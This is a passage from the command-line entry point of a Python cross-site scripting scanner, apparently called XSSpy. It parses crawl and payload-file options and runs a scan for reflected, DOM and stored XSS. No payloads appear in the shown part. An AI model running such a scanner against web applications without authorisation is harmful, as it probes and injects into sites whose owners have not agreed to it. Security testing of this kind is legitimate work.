    parser.add_argument("url", help="Starting URL to scan (e.g., http://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=3, help="Maximum crawl depth (default: 3)")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS_DEFAULT, help=f"Number of concurrent workers (default: {MAX_WORKERS_DEFAULT}) - NOTE: Currently ignored, scan is sequential.")
    parser.add_argument("-p", "--payload-list", help="Path to a file containing payload templates (one per line, # for comments)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between page processing steps in seconds (default: 0.0)") # Default delay 0
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    parser.add_argument("--log-level", default="info", choices=['debug', 'info', 'warning', 'error', 'critical'], help="Set logging level (default: info)")
    parser.add_argument("--log-file", help="Path to save log output to a file")
    parser.add_argument("--no-headless", action='store_true', help="Run browser in non-headless mode (visible window)")
    parser.add_argument("--skip-stored-check", action='store_true', help="Skip Stored XSS checks (only check Reflected/DOM)")
    parser.add_argument("-v", "--version", action="version", version=f"XSSpy Scanner v{__version__}")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # Setup logging based on arguments
    try:
        setup_logging(args.log_level, args.log_file)
    except ValueError as e:
        print(f"Error setting up logging: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
         print(f"Unexpected error configuring logging: {e}", file=sys.stderr)
         sys.exit(1)


    # Load payloads
    # FIX 2: Use the correct variable name DEFAULT_PAYLOAD_TEMPLATES
    payload_templates_to_use = DEFAULT_PAYLOAD_TEMPLATES
    if args.payload_list:
        # FIX 3 (cont.): Call the defined load_payloads function
        loaded_payloads = load_payloads(args.payload_list) # Uses log internally now
        if loaded_payloads:
            payload_templates_to_use = loaded_payloads
            log.info(f"Using {len(payload_templates_to_use)} payloads from {args.payload_list}")
        else:
            log.warning(f"Failed to load payloads from {args.payload_list}, continuing with default list.")
            # No need to set to default here, it's already the default
    else:
        log.info(f"No payload list provided ({args.payload_list}), using {len(payload_templates_to_use)} default payloads.")


    # Initialize and run scanner
    scanner = None # Initialize scanner to None
    exit_code = 0 # Default exit code
    try:
        scanner = Scanner(
            start_url=args.url,
            max_depth=args.depth,
            # workers=args.workers, # Workers currently ignored
            payload_templates=payload_templates_to_use,
            delay=args.delay,
            user_agent=args.user_agent,
            no_headless=args.no_headless,
            skip_stored=args.skip_stored_check
        )
        # Run the sequential scan
        scanner.run_scan()


    except ValueError as ve: # Catch invalid URL from constructor
         log.critical(f"Initialization Error: {ve}")
         exit_code = 1
    except KeyboardInterrupt:
         log.warning("\nScan interrupted by user.")
         print("\nScan aborted.", file=sys.stderr) # Use print for abrupt exit msg
         exit_code = 1 # Indicate interruption
    except RuntimeError as re: # Catch WebDriver init failure
         log.critical(f"Runtime Error: {re}")
         exit_code = 1
         # No need to close scanner driver if it failed during init
    except Exception as e:
         log.critical(f"An unexpected critical error occurred during scan setup or execution: {e}", exc_info=True) # Log traceback
         exit_code = 1
    finally:
         # Ensure report is generated and driver closed if scanner was initialized
         if scanner:
              scanner.report_findings() # Print summary to console
              scanner.close() # Attempt to close driver if scanner exists
         # Flush logs if logging to file
         logging.shutdown()
         sys.exit(exit_code) # Exit with appropriate code